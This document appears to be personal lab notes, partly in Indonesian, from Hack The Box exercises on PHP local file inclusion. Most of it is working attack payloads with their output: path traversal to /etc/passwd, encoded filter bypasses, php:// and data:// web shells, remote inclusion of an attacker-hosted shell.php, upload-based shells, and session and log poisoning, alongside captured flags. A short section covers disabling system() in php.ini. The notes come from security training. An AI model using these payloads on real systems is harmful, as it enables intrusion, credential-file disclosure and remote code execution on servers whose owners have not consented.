http://94.237.49.166:56586/index.php?language=../../../../etc/passwd
barry

http://94.237.49.166:56586/index.php?language=../../../../usr/share/flags/flag.txt
HTB{n3v3r_tru$t_u$3r_!nput}

languages//....//....//....//....//....//etc/passwd
http://83.136.255.150:55558/index.php?language=%6c%61%6e%67%75%61%67%65%73%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%65%74%63%2f%70%61%73%73%77%64

languages//....//....//....//....//....//flag.txt
http://83.136.255.150:55558/index.php?language=%6c%61%6e%67%75%61%67%65%73%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%66%6c%61%67%2e%74%78%74

HTB{64$!c_f!lt3r$_w0nt_$t0p_lf!}

fuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://83.136.253.251:45849/FUZZ.php
en                      [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 275ms]
es                      [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 275ms]
configure               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 276ms]

http://83.136.253.251:45849/index.php?language=php://filter/read=convert.base64-encode/resource=configure

echo "hash" | base64 -d #decrypt
HTB{n3v3r_$t0r3_pl4!nt3xt_cr3d$}

php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"


echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id

http://94.237.62.195:45255/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id

curl -s -X POST --data '<?php system($_GET["c-m-d"]); ?>' "http://94.237.62.195:45255/index.php?language=php://input&cmd=id" | grep uid

echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"

http://94.237.62.195:45255/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=ls /
http://94.237.62.195:45255/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=cat%20/37809e2f8952f06139011994726d9ef1.txt

HTB{d!$46l3_r3m0t3_url_!nclud3}

##
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_includ

echo "<php? system($_GET['']); ?>"

sudo python3 -m http.server <LISTENING_PORT>
sudo python -m pyftpdlib -p 21
impacket-smbserver -smb2support share $(pwd)

10.129.29.114/index.php?language=http://10.10.15.82:8080/shell.php&cmd=id

http://10.129.29.114/index.php?language=http://10.10.15.82:8080/shell.php&cmd=cat%20/exercise/flag.txt
99a8fc05f033f2fc0cf9a6f9826f83f4

##

echo 'GIF8<?php system($_GET["c-m-d"]); ?>' > shell.gif

<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id

echo '<?php system($_GET["c-m-d"]); ?>' > shell.php && zip shell.jpg shell.php
http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id

```
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["c-m-d"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg

http://94.237.62.195:51553/index.php?language=./profile_images/shell.gif&cmd=cat%20/2f40d853e2d4768d87da1c81772bae0a.txt
HTB{upl04d+lf!+3x3cut3=rc3}

##
PHPSESSID cookie value is nhhv8i0o6ua4g88bkdl9u1fdsd

http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning #ini ketika user melakukan sesi jadi kita bisa mengintip sesi orang
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd

http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id

curl -s "http://<SERVER_IP>:<PORT>/index.php" -A "<?php system($_GET['c-m-d']); ?>"

http://83.136.253.251:46020/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E #tab 1
http://83.136.253.251:46020/index.php?language=/var/lib/php/sessions/sess_7a3mr9ipn6d3n052siu1emb3dm&cmd=pwd #tab 2
/var/www/html

HTB{1095_5#0u1d_n3v3r_63_3xp053d}

##
- Fuzzing Parameters
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287

- LFI wordlists
ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
```
..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]
../../../../../../../../../../../../etc/hosts [Status: 200, Size: 2461, Words: 636, Lines: 72]
...SNIP...
../../../../etc/passwd  [Status: 200, Size: 3661, Words: 645, Lines: 91]
../../../../../etc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]
../../../../../../etc/passwd&=%3C%3C%3C%3C [Status: 200, Size: 3661, Words: 645, Lines: 91]
..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd [Status: 200, Size: 3661, Words: 645, Lines: 91]
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]
```

ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
/var/www/html/          [Status: 200, Size: 0, Words: 1, Lines: 1]

- Server Logs/Configurations
ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287

curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/apache2.conf
curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/envvars

ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://83.136.255.150:40951/index.php?FUZZ=value' -fs 2287 | grep -v 571
view

ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://83.136.255.150:40951/index.php?view=FUZZ' -fs 2287 | grep -v 515
../../../../../../../../../../../../../../../../../../../../../../etc/passwd

ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u http://83.136.255.150:40951/index.php?view=../../../../../../../../../../../../../../../../../../../../../../FUZZ/index.php -fs 2287 | grep -v 515
/var/www/html/ 

HTB{4u70m47!0n_f!nd5_#!dd3n_93m5}

ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u http://83.136.255.150:40951/index.php?view=../../../../../../../../../../../../../../../../../../../../../../FUZZ/index.php -fs 2287 | grep -v 515

../../../../../../../../../../../../../../../../../../../../../../etc/flag.txt
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u http://83.136.255.150:40951/index.php?

##
find / -name php.ini -type f 2> /dev/null

/etc/php/7.4/apache2/php.ini

sudo nano /etc/php/7.4/apache2/php.ini
disable_functions = system

sudo systemctl restart apache2
create sh.php in /var/www/html
```php
<?php
system('ls');
?>
```

sudo cat /var/log/apache2/error.log
PHP Warning:  system() has been disabled for security reasons in /var/www/html/test_system.php on line 2

system() has been disabled for **security** reasons.

##
php://filter/read=convert.base64-encode/resource=config
php://filter/read=convert.base64-encode/resource=index

view page source, lalu copy hasil index di dalam webnya yang (panjang itu)
lalu ubah di burp suite menjadi base64

jika sudah kita cari script ini
```
<?php 
	// echo '<li><a href="ilf_admin/index.php">Admin</a></li>'; 
?>
```

dan buka http://server:port/ilf_admin/index.php

lalu cek yang log maka nanti ada log?
jika sudah

ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u http://94.237.63.201:51059/ilf_admin/index.php?log=FUZZ --fs 2287
ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u http://94.237.63.201:51059/ilf_admin/index.php?log=FUZZ --fs 2046

2046 ini dari size yang banyak itu

http://94.237.63.201:51059/ilf_admin/index.php?log=../../../../../etc/passwd
http://94.237.63.201:51059/ilf_admin/index.php?log=../../../../../var/log/nginx/access.log

go burp suite and intrudute this url
and change user agent to

```bash
GET /ilf_admin/index.php?log=../../../../../var/log/nginx/access.log&id=ls HTTP/1.1
Host: 94.237.48.147:53485
User-Agent: <?php system($_GET[""]); ?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
```

curl -s "http://94.237.49.120:37724/ilf_admin/index.php?log=../../../../../var/log/nginx/access.log&cmd=id" -A "<?php system($_GET['....']); ?>"
